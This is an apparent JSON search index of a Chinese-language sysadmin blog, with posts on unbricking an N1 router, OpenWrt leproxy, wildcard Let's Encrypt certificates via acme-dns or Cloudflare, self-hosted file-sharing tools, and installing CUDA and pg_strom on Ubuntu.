[{"content":"aaa bbb ccc\n{{ shuffle (seq 1 5) }}\n","date":"2023-03-25T12:14:29+08:00","image":"https://h.cowbay.org/images/post-default-13.jpg","permalink":"https://h.cowbay.org/post/test-after-restore/","title":"Test After Restore"},{"content":"不久前買了一台對岸斐訊出的 N1 路由器，這台的規格很強，又有大神破解了 boot loader\n所以可以被拿來安裝 openwrt/Armbian 之類的系統做其他的應用\n因為openwrt 玩很多了，所以這次想說來試試看 Armbian\n一開始只弄出了based on ubuntu bionic 的版本，因為覺得有點舊了，所以一直想要換成 ubuntu focal\n就在某次亂搞之後，N1 他變磚了\u0026hellip;開機完全沒有畫面，只好開始研究怎麼救磚了\nN1 救磚的方法 筆記日期： 2022-03-04 17:15\n這個是已經確認 N1 變磚了，開機沒有boot loader 的狀況\n這方法不需要拆機，需要用到的檔案和線材如下\n雙公頭 USB $40-50 , shopee 買的 02_Amlogic_USB_Burning_Tool.tgz 點我下載 03_aml_upgrade_package.tgz 點我下載 04_balenaEtcher-Setup-1.7.7.exe 點我下載 05_platform-tools_r33.0.0-windows.zip 點我下載 06_T1_1.3T47_mod_by_webpad_v3_20180419_2.tgz 點我下載 一台Windows 筆電/桌機 簡單描述一下我還記得的步驟，就不上圖了，反正重要的是這些檔案，操作過程其實容易的\n先把 02/03/06 的檔案傳到筆電上，該解壓縮的，該安裝的都做一做 (在這邊至少要確定驅動程式有安裝成功，叫什麼WorldCup 有的沒的)\n02 的檔案解壓縮完會有一個license 的目錄，這個目錄要複製到 USB Burning Tool 的安裝目錄底下 一般來說應該就是\nc:\\program files(x86)\\Amlogic\\USB_BURNING_TOOL 確認複製好、解壓縮也完成了，這時候拿出 N1 、雙公頭USB、電源線並且執行 USB Burning Tool\n進入USB Burning Tool 畫面，點一下 File \u0026ndash;\u0026gt; Import image\n選擇06 解壓縮的 06_T1_1.3T47_mod_by_webpad_v3_20180419_2.img\n因為我的N1 是連 Bootloader 都掛了，所以右邊有四個選項要勾選\nErase flash Erase bootloader Overwrite key Secure Boot Key (跟圖片上的不會一樣) 還是補個圖好了，借別人的來用\n確認好之後，還先不要按開始，準備好 N1，電源接上插座，但先不要接到N1，USB 一頭接在電腦上，另一頭也是一樣先不要接到 N1\n接下來點一下USB Burning tool 的開始，然後快速的先插入電源接頭到 N1 ，然後接著插入 USB 接頭\n正常的話，這邊就會聽到聲音，然後 USB Burning Tool 就會開始燒錄，如果沒有看到開始燒錄的話，就多試幾次看看，\n我一開始就弄錯 USB 和電源的插入順序，一直沒成功\n在燒錄到21% 的時候，會跳出錯誤訊息，不用擔心，意料之中，\n這時候按下停止，然後一樣到 File \u0026ndash;\u0026gt; import image，這次選擇 03 解壓縮後的檔案aml_upgrade_package，\n右邊的選項也不用動，密鑰的部分會自動消失，然後保留上面兩個Erase flash/bootloader ，再點一次開始按鈕\n基本上這次就可以順利成功燒錄了，如果只是要救磚，到這邊就已經 OK\n這時候的機子韌體版本是 V2.19 ，如果想要可以繼續刷其他的韌體\n刷 Armbian 22.10 focal kernel 5.9 這部分已經成功了，只是還沒整理筆記(其實也沒很複雜啦)\n等到有心情想寫的時候再來補\n","date":"2022-03-09T16:29:17+08:00","image":"https://h.cowbay.org/images/post-default-14.jpg","permalink":"https://h.cowbay.org/post/how-to-save-bricked-n1-router/","title":"[筆記] Phicomm 斐訊 N1 救磚的方法/ How to Save Bricked N1 Router"},{"content":"最近在逐步的把舊有的VPN Router 汰換掉，改用wireguard 來作 full mesh site-to-site VPN\n不過這是另外的故事了\u0026hellip;\n在把wireguard VPN 都搞定之後，才發現原來 openwrt 的 uhttpd 要加上 letsencrypt 的免費憑證有點難搞\n網路上大部分都介紹用 acme.sh ，我是有測試出來啦\n但是跟網路上的方法不太一樣了，新增了滿多步驟的，覺得很麻煩\n想到向來愛用的 leproxy ，既然是 golang 開發的，又是open source\n就拿來compile 給openwrt router 用用看\n想不到還真的可以， golang 真是棒！\n不過也還是要順手改一些openwrt 東西才行\n還是簡單作個筆記好了\ncompile leproxy for arm64 當然要先確認好自己的環境有沒有裝了golang 可以用來編譯，這部分就不多提了。\n下載並編譯 leproxy git clone https://github.com/artyom/leproxy cd leproxy GOOS=linux GOARCH=arm64 go build . mv leproxy leproxy.arm64 copy leproxy.arm64 to router scp leproxy.arm64 root@192.168.0.254:/root/leproxy.arm64 接著 ssh 登入 router 作相關設定 ssh root@192.168.0.254\n建立/etc/leproxy/mapping.yml mkdir -p /etc/leproxy vim /etc/leproxy/mapping.yml 內容大概長這樣，一次可以不止一行 然後要注意 hqvpnrouter.abc.com 這個域名要先存在 A 記錄並指向這臺 router\nhqvpnrouter.abc.com: 192.168.0.254:81 前面是這臺機器的hostname , leproxy 會用這個hostname 去申請免費的憑證 後面是要把hqvpnrouter.abc.com 的要求轉到哪裡？這邊就是轉到本機(192.168.0.254)的 81 port\n修改 uhttpd config 因為leproxy 會佔用 80 ,443 兩個port 所以要把 uhttpd 改去別的port 工作 順便把 https 的設定拿掉，讓leproxy 去煩惱\n# HTTP listen addresses, multiple allowed list listen_http\t0.0.0.0:81 list listen_http\t[::]:81 # HTTPS listen addresses, multiple allowed #list listen_https\t0.0.0.0:443 #list listen_https\t[::]:443 # Redirect HTTP requests to HTTPS if possible option redirect_https\t0 然後先重啟 uhttpd\n/etc/init.d/uhttpd restart 看看 uhttpd 是不是已經改到 port 81\n[200~root@HQ_VPN_ROUTER:~# netstat -antlp netstat: showing only processes with your user ID Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:81 0.0.0.0:* LISTEN 1491/uhttpd tcp 0 0 10.2.3.2:53 0.0.0.0:* LISTEN 3540/dnsmasq 好，這時候就可以用以下指令來測試leproxy 是不是可以正常運作\ncacheDir 是會被用來存放leproxy 取得的免費憑證，必須要先存在系統中 或者是要存放在 /tmp , /root 也都可以\n/root/leproxy.arm64 -map /etc/leproxy/mapping.yml -email chchang@abc.com -cacheDir /etc/acme/ 修改 firewall config 加入底下這段\nconfig redirect option dest_port \u0026#39;443\u0026#39; option src \u0026#39;wan\u0026#39; option name \u0026#39;https for leproxy\u0026#39; option src_dport \u0026#39;443\u0026#39; option target \u0026#39;DNAT\u0026#39; option dest_ip \u0026#39;192.168.0.254\u0026#39; option dest \u0026#39;lan\u0026#39; list proto \u0026#39;tcp\u0026#39; 重啟 firewall\n這時候應該可以用 https://vpnrouter.abc.com 的方式來開啟這臺router 的管理界面\n建立 init script 在 /etc/init.d 中新增一個檔案叫 leproxy\n內容如下\n#!/bin/sh /etc/rc.common # Example script # Copyright (C) 2007 OpenWrt.org START=99 start() { echo \u0026#34;leproxy starting\u0026#34; /root/leproxy.arm64 -map /etc/leproxy/mapping.yml -email chchang@abc.com -cacheDir /etc/acme/ \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; } stop () { echo \u0026#34;leproxy stopping\u0026#34; killall leproxy.arm64 } 改一下file permission chmod u+rwx /etc/init.d/leproxy 設定開機自動啟動 /etc/init.d/leproxy enable 啟動leproxy /etc/init.d/leproxy restart 開啟 https://vpnrouter.abc.com 再做一次確認\n","date":"2021-09-29T14:38:10+08:00","image":"https://h.cowbay.org/images/post-default-8.jpg","permalink":"https://h.cowbay.org/post/init-script-in-openwrt-to-start-leproxy/","title":"Init Script in Openwrt to Start Leproxy/在openwrt 新增自動啟動leproxy的script"},{"content":"auto fetch Wildcard ssl certs with lego + acme-dns ( Domain Register : Namecheap) 自從用了 leproxy 之後，其實就很少在管ssl 憑證的問題，反正leproxy 都會自動處理好\n不過LAN裡面的機器越來越多，每次看到警告說沒有加密的訊息就有點不爽，之前用了很多方式去申請全域憑證，申請倒是還好，沒太多問題。但是一碰到要更新，就都無法自動，因為都會要求去修改DNS 的 TXT 或者是 CNAME 記錄。\n一般來說，如果是其他DNS 供應商，大部分都會提供API，那就還好。 BUT !! (對，然生就是離不開這個BUT \u0026hellip;) 我們的域名是老闆在 iwantmyname 買的，一開始是給 webfaction 代管，後來webfaction 被godaddy 買走，就轉到 namecheap 去(我也不知道為什麼不在godaddy 就好)。\nDNS 管理基本上都是大同小異啦，可是namecheap 免費賬戶不提供 API ，應該說要使用namecheap 提供的API ，需要滿足以下的條件\nI want to enable API for my account. Are there any specific requirements? We have certain requirements for activation to prevent system abuse. In order to have API enabled for your account, you should meet one of the following requirements: - have at least 20 domains under your account; - have at least $50 on your account balance; - have at least $50 spent within the last 2 years. 之前問過老闆，可不可以丟個50 鎂在賬戶裡面，好讓我可以用API 去修改DNS 來自動取得SSL 憑證，同樣地，也不知道為什麼，連50鎂也不給存\u0026hellip;\n於是過了一段每幾個月就憑證過期，需要手動更新的日子\u0026hellip;.想想實在不甘願，本來已經想說去買一些一塊美金一年的domain 然後通通移轉到namecheap ，來滿足上面的第一個條件。但是這又要自己花錢(我已經自掏腰包很多了在這邊買LAB設備)，最後決定還是用lego + acme-dns 來做\n其實前兩年就有玩過 lego ，但是當時應該是功能上還沒完整，這次在找 acme-dns 的文件時，發現lego 一直有持續更新，所以這次才決定改用 lego + acme-dns 來達到「自動更新」 SSL 憑證的需求，底下就簡單說明一下設定步驟、內容\n取得 lego \u0026amp; acme-dns lego 以及acme-dns 都是使用 golang 開發的，這也是為什麼我選用這兩個組合的原因之一，省去自己編譯還要安裝一堆有的沒的套件，兩個套件都有prebuild binary package，直接下載回來就可以了\nlego wget https://github.com/go-acme/lego/releases/download/v4.4.0/lego_v4.4.0_linux_amd64.tar.gz\nacme-dns wget https://github.com/joohoi/acme-dns/releases/download/v0.8/acme-dns_0.8_linux_amd64.tar.gz\n解壓縮後取得執行檔\ntar zxvf lego_v4.4.0_linux_amd64.tar.gz \u0026amp;\u0026amp; sudo mv lego /usr/local/bin/ tar zxvf acme-dns_0.8_linux_amd64.tar.gz \u0026amp;\u0026amp; sudo mv acme-dns /usr/local/bin/\nFirewall 設定 firewall 上開啟port mapping ，把 UDP 53 轉給這臺跑 lego 的機器\n如果這臺機器上有軟體已經佔用 53 port ，要想辦法先解決。\n對，我說的就是那個超級討厭的 systemd-resolved\n本機如果有開firewall ，記得要放行 udp 53\n設定acme-dns #建立 acme-dns 目錄 mkdir -p /etc/acme-dns mkdir -p /var/lib/acme-dns #建立 acme-dns 設定檔 sudo vim /etc/acme-dns/config.cfg config 的內容如下，順便補上一些自己的註解\n#/etc/acme-dns/config.cfg [general] # DNS interface # 本來預設是只有 :53 在某些VPS 上會出錯，所以改成 0.0.0.0:53 listen = \u0026#34;0.0.0.0:53\u0026#34; protocol = \u0026#34;udp\u0026#34; # domain name to serve the requests off of # 不是要設定的 domain，而是這臺機器要負責的sub domain # 總之就是輸入 acme 再加上原本的domain # 不想用 acme 當然也可以 domain = \u0026#34;acme.abc.com\u0026#34; # zone name server # ns1 再加上原本的 domain # 一樣，不想用ns1 也可以，後面記得作對應的修改 nsname = \u0026#34;ns1.abc.com\u0026#34; # admin email address, where @ is substituted with . # 管理者email , admin + 原本的 domain nsadmin = \u0026#34;admin.abc.com\u0026#34; # predefined records served in addition to the TXT # # 前面兩筆 A 記錄對應上面的 domain , nsname # 後面則是這臺機器的 WAN IP # 第三筆 是NS 記錄 # 這三筆記錄等一下要新增到namecheap 的DNS records = [ \u0026#34;acme.abc.com. A 11.22.33.44\u0026#34;, \u0026#34;ns1.acme.abc.com. A 11.22.33.44\u0026#34;, \u0026#34;acme.abc.com. NS ns1.abc.com.\u0026#34;, ] debug = false [database] engine = \u0026#34;sqlite3\u0026#34; connection = \u0026#34;/var/lib/acme-dns/acme-dns.db\u0026#34; ### 要記一下port ，等等會用到 [api] api_domain = \u0026#34;\u0026#34; ip = \u0026#34;127.0.0.1\u0026#34; disable_registration = false autocert_port = \u0026#34;80\u0026#34; port = \u0026#34;9000\u0026#34; tls = \u0026#34;none\u0026#34; corsorigins = [ \u0026#34;*\u0026#34; ] use_header = false header_name = \u0026#34;X-Forwarded-For\u0026#34; [logconfig] loglevel = \u0026#34;debug\u0026#34; logtype = \u0026#34;stdout\u0026#34; logformat = \u0026#34;text\u0026#34; 編輯完後，存檔離開。\n新增 acme-dns.service 的systemd config\nsudo vim /etc/systemd/system/acme-dns.service 內容如下\n# /etc/systemd/system/acme-dns.service [Unit] Description=ACMD DNS After=network.target [Service] ExecStart=/usr/local/bin/acme-dns Restart=on-failure [Install] WantedBy=multi-user.target 存檔離開，並啟用 acme-dns service\nsudo systemctl daemon-reload sudo systemctl enable --now acme-dns.service # 檢查一下狀態是否正常 sudo systemctl status acme-dns # 底下這個指令如果沒有回傳任何訊息，是正常的 curl http://localhost:9000/health 設定namecheap DNS 記錄 總共要新增兩筆A 記錄，一筆 NS 記錄 (目前)，後面還會需要新增一筆 CNAME\ndomain\nnsname\nNS record\n然後休息個五分鐘十分鐘的，讓子彈飛一下，等DNS生效\n透過lego 取得憑證 只要確認上面的防火牆設定、acme-dns 設定、以及 DNS 的修改生效之後，剩下的lego 指令就很簡單了\nhttps://go-acme.github.io/lego/dns/acme-dns/\n# 第一個ACME_DNS_API_BASE是剛剛設定acme-dns API port # 然後 ACME_DNS_STORAGE_PATH 是lego存放賬戶資料的地方 # 後面就是lego 的指令 ACME_DNS_API_BASE=http://localhost:9000 ACME_DNS_STORAGE_PATH=/home/minion/.lego-acme-dns-accounts.json lego --email changch@abc.com --dns acme-dns --domains *.abc.com run 執行完成後，會在目錄底下產生一個叫 .lego 的目錄，用來存放憑證檔案\n2021-08-26 11:55:16 [minion@hqs058 ~]$ ls -la .lego/certificates/ total 28 drwx------ 2 minion sudo 4096 Aug 26 09:35 . drwx------ 4 minion sudo 4096 Aug 26 09:33 .. -rw------- 1 minion sudo 5325 Aug 26 09:35 _.abc.com.crt -rw------- 1 minion sudo 3751 Aug 26 09:35 _.abc.com.issuer.crt -rw------- 1 minion sudo 238 Aug 26 09:35 _.abc.com.json -rw------- 1 minion sudo 227 Aug 26 09:35 _.abc.com.key 2021-08-26 11:58:22 [minion@hqs058 ~]$ 沒錯，就這麼簡單!!\n甚至於我要撤銷這些憑證也很簡單!!!\n把最後面的 run 改成 revoke 就可以了！\nACME_DNS_API_BASE=http://localhost:9000 ACME_DNS_STORAGE_PATH=/home/minion/.lego-acme-dns-accounts.json lego --email changch@abc.com --dns acme-dns --domains *.abc.com revoke 2021/08/26 11:59:13 Trying to revoke certificate for domain *.abc.com 2021/08/26 11:59:14 Certificate was revoked. 2021/08/26 11:59:14 Certificate was archived for domain: *.abc.com 再來跑一次申請新憑證測試看看\nACME_DNS_API_BASE=http://localhost:9000 ACME_DNS_STORAGE_PATH=/home/minion/.lego-acme-dns-accounts.json lego --email changch@abc.com --dns acme-dns --domains *.abc.com run 2021/08/26 12:00:51 [INFO] [*.abc.com] acme: Obtaining bundled SAN certificate 2021/08/26 12:00:52 [INFO] [*.abc.com] AuthURL: https://acme-v02.api.letsencrypt.org/acme/authz-v3/25150773810 2021/08/26 12:00:52 [INFO] [*.abc.com] acme: authorization already valid; skipping challenge 2021/08/26 12:00:52 [INFO] [*.abc.com] acme: Validations succeeded; requesting certificates 2021/08/26 12:00:53 [INFO] [*.abc.com] Server responded with a certificate. 同樣地，會產生新的ssl 憑證\n2021-08-26 12:00:53 [minion@hqs058 ~]$ ls -la .lego/certificates/ total 28 drwx------ 2 minion sudo 4096 Aug 26 12:00 . drwx------ 5 minion sudo 4096 Aug 26 11:59 .. -rw------- 1 minion sudo 5325 Aug 26 12:00 _.abc.com.crt -rw------- 1 minion sudo 3751 Aug 26 12:00 _.abc.com.issuer.crt -rw------- 1 minion sudo 238 Aug 26 12:00 _.abc.com.json -rw------- 1 minion sudo 227 Aug 26 12:00 _.abc.com.key 2021-08-26 12:02:37 [minion@hqs058 ~]$ 超方便的啊！！！！\n後面要更新就把指令最後的 run 改成 renew\nACME_DNS_API_BASE=http://localhost:9000 ACME_DNS_STORAGE_PATH=/home/minion/.lego-acme-dns-accounts.json lego --email changch@abc.com --dns acme-dns --domains *.abc.com renew 2021/08/26 12:04:00 [*.abc.com] The certificate expires in 89 days, the number of days defined to perform the renewal is 30: no renewal. 因為是剛剛才要到的憑證，當然是不能更新啦\u0026hellip;\n把這個指令寫到 crontab ，以後時間到了就會自動更新憑證\n後續再搭配 ansible 來抓新的憑證，派送到其他伺服器去\n終於可以不用再為ssl 憑證煩惱了！！！\n","date":"2021-08-26T12:08:43+08:00","image":"https://h.cowbay.org/images/post-default-8.jpg","permalink":"https://h.cowbay.org/post/auto-fetch-wildcard-ssl-certs-acme-dns-lego/","title":"auto fetch  Wildcard ssl certs with lego + acme-dns ( Domain Register : Namecheap)"},{"content":"最近又接到之前處理過的需求，要讓使用者可以在外部上傳、編輯 yaml 檔案\n之前是用 gohttpd 來做\n可是不支援線上編輯 yaml 檔案\n這次找到了 cloudcmd\nhttps://github.com/coderaiser/cloudcmd\n簡單好用、不需要太多設定，但是想要的設定大致上也都有、有提供docker-compose\n同時也支援多種檔案的預覽、編輯功能\n算是很不錯的一個web-based 的檔案管理系統\n登入時，會詢問帳號密碼 也可以設定成不詢問直接進入\n支援多種檔案的預覽和編輯 MP4 影片\nJPG檔案\nCSV 檔案\n編輯YAML\n空白處按右鍵的功能表\n檔案功能表\n系統功能設定\n目前用起來感覺還不錯，應該會推薦這套上去給老闆決定要不要開給user使用！\n","date":"2021-07-20T09:19:47+08:00","image":"https://h.cowbay.org/images/post-default-2.jpg","permalink":"https://h.cowbay.org/post/cloudcmd-web-file-manager/","title":"[筆記] WEB 檔案管理 Cloudcmd Web File Manager"},{"content":"感覺最近應該會用到類似這樣的功能，趁著最近比較閒一點\n就把系統弄起來玩玩看，順便建立ansible 的playbook\nlinx-server https://github.com/andreimarcu/linx-server\n目前已經停止開發的樣子\n有Docker 版本，裝起來很容易，用起來也不難\n可以自行架設伺服器\n可以上傳任意類型的檔案\n可以直接線上分享文字\n可以自定分享密碼\n上傳界面可以鎖密碼，但是鎖了密碼之後，就沒辦法用命令上傳檔案(不知道怎麼帶KEY進去)\n不支援整個目錄上傳 關於API 如何使用沒有一個完整的說明 始終找不到怎麼建立API KEY 在console 下，可以直接上傳並取得超連結\nchchang@hqdc039:~/docker/linx-server$ cat linx-server.conf bind = 0.0.0.0:7779 sitename = myLinx siteurl = https://share.com.tw maxsize = 4294967296 maxexpiry = 43200 selifpath = s allowhotlink = false remoteuploads = false nologs = true force-random-filename = true cleanup-every-minutes = 5 basicauth = false authfile = /data/authfile chchang@hqdc039:~/docker/linx-server$ docker-compose up -d Creating linx-server ... done chchang@hqdc039:~/docker/linx-server$ ./linx-client README.md Copied https://share.com.tw/fyd81h81.md into clipboard! chchang@hqdc039:~/docker/linx-server$ Psitransfer https://github.com/psi-4ward/psitransfer\n不支援command 上傳\n有docker版本，架設容易\n適合給一般使用者用，可以自行設定密碼、保存期限\n比較特別的是下載的連結可以產生QRCODE\n上傳檔案的頁面也可以鎖密碼\npictshare https://github.com/HaschekSolutions/pictshare\n有docker版本，但是需要自己手動調整\n不然調整過的config 都會被蓋掉\n調整過後的docker-compose.yml 我放了一份到github 上\nhttps://github.com/changchichung/docker-compose-pictshare\n需要拿掉pictshare.sh 中，每次自動更新config的部分\n雖然web UI 有點醜，但是基本上想要的功能都有了\n可以用WEB傳，也可以用terminal 傳\n不限制上傳的檔案類型\n可以限制可以上傳的subnet\n回傳的URL 也可以有副檔名，所以可以直接連結當作圖床\n算是很不錯用的了\nupload in terminal chchang@hqdc039:~/docker/pictshare$ pict ~/Downloads/images/IMG_20190717_092723.jpg https://share.com.tw/1dpobr.jpg chchang@hqdc039:~/docker/pictshare$ 就先決定用這個 pictshare 吧\n另外推薦的工具 anypaste https://github.com/markasoftware/anypaste\n這個雖然不能自己建立服務，需要依賴internet 上已經存在的多個網站服務\n像是 file.io imgur hastebin 等等\n不過呢，如果不是那麼計較安全性，要上傳的檔案不介意丟在internet上公開\n那真的很推薦這個指令，不用安裝有的沒的一大堆，anypaste 本身就是一個script 整合了各家服務的上傳指令\n所以「理論上」 要修改也不是太難..\n跑起來大概像這樣\nchchang@hqdc039:~/docker/pictshare$ anypaste ~/Downloads/images/IMG_20190717_092723.jpg Current file: /home/chchang/Downloads/images/IMG_20190717_092723.jpg Attempting to upload with plugin \u0026#39;imgur\u0026#39; ################################################################################################################# 100.0% Link: https://imgur.com/y0Suzjf Direct: https://i.imgur.com/y0Suzjf.jpg Edit: https://imgur.com/edit?deletehashD Delete: https://imgur.com/delete/fNJ Upload complete. Sucessfully uploaded: \u0026#39;/home/chchang/Downloads/images/IMG_20190717_092723.jpg\u0026#39; All files processed. Have a nice day! chchang@hqdc039:~/docker/pictshare$ 也是非常方便的一個工具，值得推薦！\n","date":"2021-06-25T15:49:54+08:00","image":"https://h.cowbay.org/images/post-default-18.jpg","permalink":"https://h.cowbay.org/post/various-self-hosted-file-sharing-system-test/","title":"[筆記] 幾種可以自建服務的 File Sharing 系統比較"},{"content":"最近又開始在亂搞postgresql ，一直想要玩玩看GPU運算的威力，大概一年多前，有測試了 ubuntu 18.04 + postgresql + pg_strom ，可是當時因為pg_strom 不支援當時手邊的顯示卡，只好作罷。\nBreaks here\ntitle: \u0026ldquo;ubuntu 20.04 install nvidia driver / CUDA / postgresql / pg_strom\u0026rdquo; 這次搞到一張GTX 1030 顯示卡，作業系統也升級到了 ubuntu 20.04 ，就再來弄一次看看\n安裝 nvidia Driver 我還是選擇用 apt 新增ppa 的方式來安裝\nsudo add-apt-repository ppa:graphics-drivers/ppa sudo apt update sudo apt install ubuntu-drivers-common sudo apt install nvidia-driver-450 sudo reboot 重開機後檢查一下是否有成功安裝\nchchang@hqdc039:~/git/pg-strom$ lsmod|grep nvidia nvidia_uvm 1007616 2 nvidia_drm 49152 9 nvidia_modeset 1183744 11 nvidia_drm nvidia 19722240 622 nvidia_uvm,nvidia_modeset drm_kms_helper 184320 2 nvidia_drm,i915 drm 491520 13 drm_kms_helper,nvidia_drm,i915 chchang@hqdc039:~/git/pg-strom$ OK ，看起來應該是沒有問題，接著來安裝 CUDA\n安裝 CUDA 下載 CUDA 安裝檔案 axel -n 10 http://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_418.87.00_linux.run 執行安裝檔案進行安裝 注意在後面加上了 \u0026ndash;override ，這是因為 ubuntu 20.04 預設的 gcc 是 9 ，但是 CUDA 目前還是只支援到 7 ，所以先用override 來解決這個問題，不然會出現 gcc version 的錯誤\nsudo bash cuda_10.1.243_418.87.00_linux.run --override 安裝過程 nvidia 已經做成選單，就選擇要安裝的東西，記得不要選 Driver，因為剛剛已經安裝過了！\n安裝完成後，需要修改一下 bashrc https://cyfeng.science/2020/05/02/ubuntu-install-nvidia-driver-cuda-cudnn-suits/\necho \u0026#39;# CUDA Soft Link\u0026#39; \u0026gt;\u0026gt; ~/.bashrc echo \u0026#39;export PATH=/usr/local/cuda-10.1/bin${PATH:+:${PATH}}\u0026#39; \u0026gt;\u0026gt; ~/.bashrc echo \u0026#39;export LD_LIBRARY_PATH=/usr/local/cuda-10.1/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}\u0026#39; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc 然後確認一下是不是正確安裝了\nchchang@hqdc039:~/git/pg-strom$ nvcc --version nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2019 NVIDIA Corporation Built on Sun_Jul_28_19:07:16_PDT_2019 Cuda compilation tools, release 10.1, V10.1.243 chchang@hqdc039:~/git/pg-strom$ 安裝 postgresql ubuntu 20.04 預設就是搭載 postgresql 12 ，所以安裝很方便\nsudo apt install postgresql-12 postgresql-client-12 postgresql-client-common postgresql-client postgresql-common postgresql-contrib postgresql-server-dev-12 安裝 pg_strom 因為pg_strom 一樣也是不支援 gcc9 , g++9 ，所以先安裝會用到的套件\nsudo apt install libicu-dev gcc-7 g++-7 libpmem-dev 然後改掉系統上的 gcc / g++\nsudo unlink /usr/bin/gcc sudo unlink /usr/bin/g++ sudo ln -s /usr/bin/gcc-7 /usr/bin/gcc sudo ln -s /usr/bin/g++-7 /usr/bin/g++ 然後clone pg_strom 回來做編譯， pg_config 的位置要看安裝的版本來決定 同時也要修改兩個檔案的link\nsudo ln -snf /usr/lib/postgresql/12/lib/libpgcommon.a /usr/lib/x86_64-linux-gnu/libpgcommon.a sudo ln -snf /usr/lib/postgresql/12/lib/libpgport.a /usr/lib/x86_64-linux-gnu/libpgport.a git clone https://github.com/heterodb/pg-strom.git cd pg-strom make PG_CONFIG=/usr/lib/postgresql/12/bin/pg_config sudo make install 這邊成功編譯之後，要來修改一下 postgresql，在 /etc/postgresql/12/main/postgresql.conf 中，加入底下這行\nshared_preload_libraries = \u0026#39;$libdir/pg_strom\u0026#39; 然後重啟 postgresql service ，觀察一下syslog 有沒有錯誤 如果服務有起來，那基本上就安裝成功了\n之後再來找看看有什麼測試pg_strom 的方式\n","date":"2020-11-18T14:24:30+08:00","image":"https://h.cowbay.org/images/post-default-3.jpg","permalink":"https://h.cowbay.org/post/install-postgresql-pg_strom-nvidia_driver-cuda-in-ubuntu-20.04/","title":"ubuntu 20.04 install nvidia driver / CUDA / postgresql / pg_strom"},{"content":"之前用caddy 作為反向代理，其中一個優勢就是caddy 會自動處理Letsencrypt 憑證的問題\n也不用煩惱怎麼去更新一堆有的沒的\n不過，實際應用上，還是偶爾會拿這些憑證檔案來用的狀況\n雖然可以從caddy 上面取得這些檔案\n但是基本上這些檔案都是綁定一個特定的hostname\n可是我想要有一個憑證，可以給同網域底下的機器用 ( Wildcard certificates )\n要申請Wildcard certificates ，必須要採用 DNS 驗證的方式\n一般手動操作的步驟，會先產生一組亂數字串，然後更新 DNS 上面去\n如果要改成自動化，要多一些步驟\n安裝 certbot 及 Cloudflare 外掛 首先，先來安裝會用到的套件\nsudo apt install certbot letsencrypt python3-certbot-dns-cloudflare 設定 cloudflare API 這個步驟我測了好久，網路上的說明似乎都過期了，造成cloudflare API 那邊會發生錯誤\n先登入 cloudflare 管理界面的API token 設定\nhttps://dash.cloudflare.com/profile/api-tokens\n建立一組token\n內容如下\n在權限設定的地方，選擇三個項目\nzone-zone settings-edit zone-zone-edit zone-DNS-edit\n在下一個 zone resources 選擇 include-All zones\n存檔後會產生一組 API token ，接著就是用這組 token 來做DNS更新\n編輯 cloudflare 設定檔 在 /etc底下新增一個 cloudflare.ini\n內容如下\nsudo vim /etc/cloudflare.ini dns_cloudflare_email = #email@address.here dns_cloudflare_api_key = #API token here 存檔後離開，然後改一下權限，不然等一下certbot 會跳警告\nsudo chmod 0600 /etc/cloudflare.ini 執行certbot 取得憑證 執行以下的指令\nsudo certbot certonly --dns-cloudflare --dns-cloudflare-credentials /etc/cloudflare.ini --preferred-challenges=dns --email admin@abc.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d abc.com -d *.abc.com 正常的話，會是這樣的結果\nsudo certbot certonly --dns-cloudflare --dns-cloudflare-credentials /etc/cloudflare.ini --preferred-challenges=dns --email admin@abc.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d abc.com -d *.abc.com Saving debug log to /var/log/letsencrypt/letsencrypt.log Plugins selected: Authenticator dns-cloudflare, Installer None Obtaining a new certificate Performing the following challenges: dns-01 challenge for abc.com dns-01 challenge for abc.com Waiting 10 seconds for DNS changes to propagate Waiting for verification... Cleaning up challenges IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/abc.com/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/abc.com/privkey.pem Your cert will expire on 2020-12-01. To obtain a new or tweaked version of this certificate in the future, simply run certbot again. To non-interactively renew *all* of your certificates, run \u0026#34;certbot renew\u0026#34; - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let\u0026#39;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le 這樣子就取得了全域通用的SSL 憑證檔案\n如果看到底下這種錯誤\nadministrator@ubuntu:~$ sudo certbot certonly --dns-cloudflare --dns-cloudflare-credentials /etc/cloudflare.ini --preferred-challenges=dns --email admin@abc.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d abc.com -d *.abc.com Saving debug log to /var/log/letsencrypt/letsencrypt.log Plugins selected: Authenticator dns-cloudflare, Installer None Obtaining a new certificate Performing the following challenges: dns-01 challenge for abc.com dns-01 challenge for abc.com Cleaning up challenges Error determining zone_id: 6003 Invalid request headers. Please confirm that you have supplied valid Cloudflare API credentials. (Did you copy your entire API key?) 那就是cloudflare API 那邊的權限設定錯了，我就是在這邊卡很久\u0026hellip;\n請參照上面的步驟和圖片正確的設定\n可以用 certbot certificates 來驗證看看\nadministrator@ubuntu:~$ sudo certbot certificates Saving debug log to /var/log/letsencrypt/letsencrypt.log - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Found the following certs: Certificate Name: abc.com Domains: abc.com *.abc.com Expiry Date: 2020-12-01 05:31:31+00:00 (VALID: 89 days) Certificate Path: /etc/letsencrypt/live/abc.com/fullchain.pem Private Key Path: /etc/letsencrypt/live/abc.com/privkey.pem - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 之後就可以用\nsudo certbot renew 來更新憑證\n寫到/etc/crontab 去排程每個月的1號自動更新\nadministrator@ubuntu:~$ echo \u0026#34;* * 1 * * root /usr/bin/certbot renew\u0026#34; |sudo tee -a /etc/crontab * * 1 * * root /usr/bin/certbot renew administrator@ubuntu:~$ 接下來就等三個月之後，檢查看看憑證是否有自動更新了！\n","date":"2020-09-02T15:55:40+08:00","image":"https://h.cowbay.org/images/post-default-4.jpg","permalink":"https://h.cowbay.org/post/ubuntu-letsencrypt-cloudflare-wildcard/","title":"[筆記] 在 ubuntu 20.04 底下，用certbot 